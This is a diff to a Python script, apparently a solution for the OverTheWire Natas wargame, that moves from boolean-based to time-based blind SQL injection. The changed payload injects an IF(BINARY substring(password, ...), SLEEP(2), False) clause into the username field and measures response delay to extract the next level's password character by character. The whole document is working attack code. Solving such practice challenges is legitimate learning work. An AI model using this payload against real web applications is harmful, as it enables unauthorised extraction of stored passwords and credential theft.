@@ -3,8 +3,9 @@ import requests     # For http requests
 from requests.auth import HTTPBasicAuth
 
 # Basic htpp request variables
-login = HTTPBasicAuth("natas15", "****") # add your own password :P
-url = "http://natas15.natas.labs.overthewire.org/"
+login = HTTPBasicAuth("natas17", "****") # add your own password :P
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+url = "http://natas17.natas.labs.overthewire.org/"
 
 # Password generator
 count = 1
@@ -17,10 +18,10 @@ while count <= max_lenght:
     # ... for each valid character (numbers, lowercase and uppercase)
     for c in valid_characters:
         # Our payload
-        payload = "natas16\" AND BINARY substring(password, 1, " + str(count) + ") = \"" + password + c + "\" -- "
-        response = requests.post(url, data = {"username": payload}, auth = login, verify = False)
+        payload = "natas18\" AND IF(BINARY substring(password, 1, " + str(count) + ") = \"" + password + c + "\", SLEEP(2), False) -- "
+        response = requests.post(url, data = {"username": payload}, headers = headers, auth = login, verify = False)
         # We got a hit
-        if "This user exists." in response.text:
+        if response.elapsed.total_seconds() > 2:
             print("Found: " + password + c)
             password += c
             count += 1
